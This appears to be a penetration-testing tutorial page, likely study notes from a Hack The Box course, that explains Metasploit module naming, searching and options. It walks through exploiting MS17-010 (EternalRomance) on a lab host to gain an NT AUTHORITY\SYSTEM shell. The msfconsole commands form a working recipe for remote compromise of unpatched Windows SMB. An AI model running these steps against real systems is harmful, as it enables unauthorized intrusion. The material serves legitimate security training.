# Modules

## <mark style="color:red;">Modules</mark>

***

Metasploit `modules` are prepared scripts with a specific purpose .The `exploit` category consists of so-called proof-of-concept (`POCs`) that can be used to exploit existing vulnerabilities in a largely automated manner.&#x20;

<mark style="color:green;">**Syntax**</mark>

```shell-session
<No.> <type>/<os>/<service>/<name>
```

<mark style="color:green;">**Example**</mark>

```shell-session
794   exploit/windows/ftp/scriptftp_list
```

<mark style="color:green;">**Index No.**</mark>

The `No.` tag will be displayed to select the exploit we want afterward during our searches. We will see how helpful the `No.` tag can be to select specific Metasploit modules later.

<mark style="color:green;">**Type**</mark>

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Type</strong></td><td><strong>Description</strong></td></tr><tr><td><code>Auxiliary</code></td><td>Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.</td></tr><tr><td><code>Encoders</code></td><td>Ensure that payloads are intact to their destination.</td></tr><tr><td><code>Exploits</code></td><td>Defined as modules that exploit a vulnerability that will allow for the payload delivery.</td></tr><tr><td><code>NOPs</code></td><td>(No Operation code) Keep the payload sizes consistent across exploit attempts.</td></tr><tr><td><code>Payloads</code></td><td>Code runs remotely and calls back to the attacker machine to establish a connection (or shell).</td></tr><tr><td><code>Plugins</code></td><td>Additional scripts can be integrated within an assessment with <code>msfconsole</code> and coexist.</td></tr><tr><td><code>Post</code></td><td>Wide array of modules to gather information, pivot deeper, etc.</td></tr></tbody></table>

<mark style="color:green;">**OS**</mark>

The `OS` tag specifies which operating system and architecture the module was created for. Naturally, different operating systems require different code to be run to get the desired results.

<mark style="color:green;">**Service**</mark>

The `Service` tag refers to the vulnerable service that is running on the target machine. For some modules, such as the `auxiliary` or `post` ones, this tag can refer to a more general activity such as `gather`, referring to the gathering of credentials, for example.

<mark style="color:green;">**Name**</mark>

Finally, the `Name` tag explains the actual action that can be performed using this module created for a specific purpose.

***

### <mark style="color:red;">Searching for Modules</mark>

<mark style="color:green;">**MSF - Search Function**</mark>

```shell-session
msf6 > help search

Usage: search [<options>] [<keywords>:<value>]
```

For example, we can try to find the `EternalRomance` exploit for older Windows operating systems. This could look something like this:

***

<mark style="color:green;">**MSF - Searching for EternalRomance**</mark>

{% code fullWidth="true" %}
```bash
msf6 > search eternalromance
```
{% endcode %}

{% hint style="warning" %}
We can also make our search a bit more coarse and reduce it to one category of services. For example, for the CVE, we could specify the year (`cve:<year>`), the platform Windows (`platform:<os>`), the type of module we want to find (`type:<auxiliary/exploit/post>`), the reliability rank (`rank:<rank>`), and the search name (`<pattern>`). This would reduce our results to only those that match all of the above.
{% endhint %}

<mark style="color:green;">**MSF - Specific Search**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```
{% endcode %}

***

### <mark style="color:red;">Module Selection</mark>

To select our first module, we first need to find one. Let's suppose that we have a target running a version of SMB vulnerable to EternalRomance (MS17\_010) exploits. We have found that SMB server port 445 is open upon scanning the target.

```shell-session
mrroboteLiot@htb[/htb]$ nmap -sV 10.10.10.40
```

We would boot up `msfconsole` and search for this exact exploit name.

<mark style="color:green;">**MSF - Search for MS17\_010**</mark>

```shell-session
msf6 > search ms17_010
```

Next, we want to select the appropriate module for this scenario. From the `Nmap` scan, we have detected the SMB service running on version `Microsoft Windows 7 - 10`. With some additional OS scanning, we can guess that this is a Windows 7 running a vulnerable instance of SMB. We then proceed to select the module with the `index no. 2` to test if the target is vulnerable.

***

### <mark style="color:red;">Using Modules</mark>

Within the interactive modules, there are several options that we can specify. These are used to adapt the Metasploit module to the given environment. Because in most cases, we always need to scan or attack different IP addresses. Therefore, we require this kind of functionality to allow us to set our targets and fine-tune them. To check which options are needed to be set before the exploit can be sent to the target host, we can use the `show options` command. Everything required to be set before the exploitation can occur will have a `Yes` under the `Required` column.

<mark style="color:green;">**MSF - Select Module**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 > use 0
msf6 exploit(windows/smb/ms17_010_psexec) > options
```
{% endcode %}

<mark style="color:green;">**MSF - Module Information**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > info

------------------------------------------------
```
{% endcode %}

After we are satisfied that the selected module is the right one for our purpose, we need to set some specifications to customize the module to use it successfully against our target host, such as setting the target (`RHOST` or `RHOSTS`).

<mark style="color:green;">**MSF - Target Specification**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40


msf6 exploit(windows/smb/ms17_010_psexec) > options

-----
```
{% endcode %}

In addition, there is the option `setg`, which specifies options selected by us as permanent until the program is restarted. Therefore, if we are working on a particular target host, we can use this command to set the IP address once and not change it again until we change our focus to a different IP address.

<mark style="color:green;">**MSF - Permanent Target Specification**</mark>

{% code fullWidth="true" %}
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40


msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   
```
{% endcode %}

Once everything is set and ready to go, we can proceed to launch the attack. Note that the payload was not set here, as the default one is sufficient for this demonstration.

<mark style="color:green;">**MSF - Exploit Execution**</mark>

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > run

meterpreter> shell

C:\Windows\system32>
```

We now have a shell on the target machine, and we can interact with it.

<mark style="color:green;">**MSF - Target Interaction**</mark>

```shell-session
C:\Windows\system32> whoami

whoami
nt authority\system
```
